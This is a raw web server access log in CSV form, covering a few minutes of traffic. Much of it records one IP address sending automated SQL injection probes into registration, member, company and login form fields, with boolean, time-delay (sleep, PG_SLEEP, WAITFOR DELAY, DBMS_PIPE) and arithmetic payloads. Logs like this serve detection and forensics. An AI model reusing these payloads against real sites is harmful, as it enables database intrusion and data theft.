timestamp,ip,user_agent,path,method,input
2025-03-20 21:44:44,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:45:04,51.222.253.9,Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/),company/detail/134/product/detail/902,GET,
2025-03-20 21:46:42,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""(select 198766*667891)"", ""tag"": [""7""]}"
2025-03-20 21:46:43,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'""], ""post_code"": ""94102""}"
2025-03-20 21:46:46,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""estimate"", ""remember"": ""-1\"" OR 5*5=25 or \""ExVZn1PA\""=\""""}"
2025-03-20 21:46:54,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1 OR 5*5=25 --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:47:48,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""(select DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15) from dual)""], ""post_code"": ""94102""}"
2025-03-20 21:48:48,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:48:50,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""(select 198766*667891)""], ""post_code"": ""94102""}"
2025-03-20 21:48:52,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""on'\""""}"
2025-03-20 21:48:55,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing"", ""login_type"": ""project"", ""remember"": ""(select 198766*667891)""}"
2025-03-20 21:49:52,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:49:53,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""if(now()=sysdate(),sleep(15),0)"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:50:03,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""1""], ""post_code"": ""(select 198766*667891)""}"
2025-03-20 21:51:09,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""-1' OR 5*5=25 --"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:51:46,51.222.253.2,Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/),product/detail/469,GET,
2025-03-20 21:51:57,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",hankuelogi,POST,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_code"": ""Testing""}"
2025-03-20 21:52:01,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""-1\"" OR 5*5=25 --"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:52:26,88.203.186.24,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",article,GET,
2025-03-20 21:52:56,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 21:52:57,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX0\""XOR(if(now()=sysdate(),sleep(15),0))XOR\""Z"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:53:03,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""-1' OR 5*5=25 --""]}"
2025-03-20 21:53:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIXFXjeZHWe"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""0"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:53:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""-1\"" OR 5*5=25 or \""HZ5XlwyT\""=\""""]}"
2025-03-20 21:53:28,206.189.153.207,Mozilla/5.0 zgrab/0.x,ab2h,GET,
2025-03-20 21:53:30,206.189.153.207,Mozilla/5.0 zgrab/0.x,/,GET,
2025-03-20 21:54:00,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1 OR 5*5=26 --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:54:03,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1 OR 5*5=25"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:54:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102""}"
2025-03-20 21:55:11,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""-1' OR 5*5=25 --""}"
2025-03-20 21:56:05,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""-1\"" OR 5*5=26 or \""w3FOU3wJ\""=\"""", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:56:16,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street0\""XOR(if(now()=sysdate(),sleep(15),0))XOR\""Z"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:57:10,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""-1\"" OR 5*5=26 or \""HDef9Cei\""=\""""}"
2025-03-20 21:58:15,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX2wvkRlgt' OR 239=(SELECT 239 FROM PG_SLEEP(15))--"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1""}"
2025-03-20 21:59:13,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 21:59:16,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""terms"": ""1""}"
2025-03-20 22:01:15,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\""+(select(0)from(select(sleep(15)))v)+\""*/"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 22:01:24,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",company,GET,"{""category"": ""10"", ""scene"": ""1"", ""tag"": [""7-1); waitfor delay '0:0:15' --""]}"
2025-03-20 22:01:27,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna StreetzxyXBMPn' OR 666=(SELECT 666 FROM PG_SLEEP(15))--"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 22:01:49,40.77.167.72,"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",article/detail/25,GET,
2025-03-20 22:01:57,172.31.8.254,ELB-HealthChecker/2.0,api/health-check,GET,
2025-03-20 22:02:03,3.229.164.203,"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36",article/detail/225,GET,
2025-03-20 22:02:21,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX-1 waitfor delay '0:0:15' --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""g-recaptcha-response"": ""555"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""1"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 22:02:26,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",register,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX-1 waitfor delay '0:0:15' --"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""company_name"": ""BlgeAjyo"", ""department"": ""1"", ""email"": ""testing@example.com"", ""first_name"": ""BlgeAjyo"", ""first_name_kana"": ""BlgeAjyo"", ""industry"": ""1"", ""last_name"": ""BlgeAjyo"", ""last_name_kana"": ""BlgeAjyo"", ""mail_magazine"": ""0"", ""phone"": ""555-666-0606"", ""position"": ""1"", ""post_code"": ""94102"", ""posts_captcha_input"": ""1"", ""posts_recaptcha_token"": ""1"", ""privacy_policy"": ""1"", ""terms"": ""1""}"
2025-03-20 22:02:43,107.173.62.33,"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/133.0.6943.120 Mobile/15E148 Safari/604.1",member,GET,"{""_token"": ""E0JvTMDeCPMlYXzVk3GHxiW16ngdtzJj9jOpnbIX"", ""company_address01"": ""3137 Laguna Street"", ""company_address02"": ""3137 Laguna Street"", ""effect"": [""2""], ""inquiry"": [""1""], ""post_code"": ""94102-1; waitfor delay '0:0:15' --""}"
